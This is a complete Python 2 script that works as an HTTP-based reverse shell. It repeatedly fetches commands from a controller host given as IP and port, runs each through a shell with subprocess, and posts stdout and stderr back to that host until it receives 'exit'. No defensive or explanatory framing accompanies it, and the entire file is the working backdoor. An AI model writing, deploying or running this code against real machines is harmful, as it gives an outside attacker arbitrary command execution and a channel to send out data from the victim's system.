import sys
import requests
import subprocess
import time


def main():
    if len(sys.argv) < 3:
        print '[!] Usage: ', __file__, ' <ip> <port>'
        return

    sys.argv = sys.argv[1:]
    url = 'http://' + sys.argv[0] + ':' + sys.argv[1]
    while True:
        request = requests.get(url)
        command = request.text

        command_split = command.split(' ', 1)
        action = command_split[0].lower()
        if len(command_split) == 2:
            args = command_split[1]
        else:
            args = ''

        if 'exit' in action:
            break
        else:
            cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            requests.post(url=url, data=cmd.stdout.read())
            requests.post(url=url, data=cmd.stderr.read())

        time.sleep(3)

main()
